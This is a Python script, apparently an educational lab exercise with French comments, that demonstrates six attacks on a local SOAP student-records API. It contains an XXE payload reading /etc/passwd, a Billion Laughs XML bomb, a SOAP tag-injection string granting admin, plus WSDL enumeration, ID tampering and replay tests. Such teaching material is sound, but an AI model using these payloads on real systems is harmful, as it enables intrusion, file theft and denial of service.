from zeep import Client
import requests
import time

SOAP_URL = 'http://localhost:8000'
WSDL_URL = f'{SOAP_URL}/?wsdl'


def attaque_xxe():
    print("\n1. XXE - XML External Entity Injection")
    print("-" * 50)
    
    xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <vulnerable_method>
      <xml_input>&xxe;</xml_input>
    </vulnerable_method>
  </soap:Body>
</soap:Envelope>'''
    
    print("  Tentative d'injection XXE...")
    print("  Payload: Lecture de fichier systeme")
    print("  Impact: Lecture de fichiers locaux, SSRF")


def attaque_xml_bomb():
    print("\n2. XML BOMB - Billion Laughs Attack")
    print("-" * 50)
    
    xml_bomb = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>'''
    
    print("  Tentative d'expansion XML exponentielle...")
    print("  Impact: Deni de service, consommation memoire excessive")


def attaque_soap_injection():
    print("\n3. SOAP INJECTION")
    print("-" * 50)
    
    try:
        client = Client(WSDL_URL)
        
        malicious_input = "Test</filiere><admin>true</admin><filiere>Test"
        
        print(f"  Payload: {malicious_input}")
        result = client.service.rechercher_par_filiere(malicious_input)
        print(f"  Reponse: {result}")
        print("  Impact: Manipulation de la structure SOAP")
    except Exception as e:
        print(f"  Erreur: {e}")


def attaque_wsdl_enumeration():
    print("\n4. WSDL ENUMERATION")
    print("-" * 50)
    
    try:
        response = requests.get(WSDL_URL, timeout=5)
        
        print("  WSDL accessible publiquement")
        print(f"  URL: {WSDL_URL}")
        
        if 'wsdl' in response.text.lower():
            print("  Methodes decouvertes:")
            methods = ['obtenir_etudiant', 'lister_etudiants', 'ajouter_etudiant',
                      'modifier_etudiant', 'supprimer_etudiant', 'rechercher_par_filiere']
            for method in methods:
                if method in response.text:
                    print(f"    - {method}")
        
        print("  Impact: Decouverte de l'architecture et des methodes")
    except Exception as e:
        print(f"  Erreur: {e}")


def attaque_parameter_tampering():
    print("\n5. PARAMETER TAMPERING")
    print("-" * 50)
    
    try:
        client = Client(WSDL_URL)
        
        print("  Tentative d'acces a un ID non autorise...")
        result = client.service.obtenir_etudiant(999)
        print(f"  ID 999: {result}")
        
        result = client.service.obtenir_etudiant(-1)
        print(f"  ID -1: {result}")
        
        print("  Impact: Acces a des ressources non autorisees")
    except Exception as e:
        print(f"  Erreur: {e}")


def attaque_replay():
    print("\n6. REPLAY ATTACK")
    print("-" * 50)
    
    try:
        client = Client(WSDL_URL)
        
        print("  Envoi d'une requete...")
        result1 = client.service.lister_etudiants()
        
        time.sleep(1)
        
        print("  Rejeu de la meme requete...")
        result2 = client.service.lister_etudiants()
        
        if result1 == result2:
            print("  [SUCCES] Replay attack possible - pas de protection")
        
        print("  Impact: Rejeu d'operations sensibles")
    except Exception as e:
        print(f"  Erreur: {e}")


def main():
    print("\n" + "=" * 50)
    print("DEMONSTRATIONS D'ATTAQUES SUR API SOAP")
    print("=" * 50)
    print("\nAVERTISSEMENT: Ces attaques sont a des fins educatives uniquement")
    print("Ne jamais utiliser sur des systemes sans autorisation")
    print("\n" + "=" * 50)
    
    try:
        requests.get(SOAP_URL, timeout=2)
    except:
        print("\nERREUR: Le serveur SOAP ne repond pas")
        print("Demarrez le serveur avec: python soap/api_soap.py")
        return
    
    attaque_xxe()
    attaque_xml_bomb()
    attaque_soap_injection()
    attaque_wsdl_enumeration()
    attaque_parameter_tampering()
    attaque_replay()
    
    print("\n" + "=" * 50)
    print("DEMONSTRATIONS TERMINEES")
    print("=" * 50)


if __name__ == '__main__':
    main()
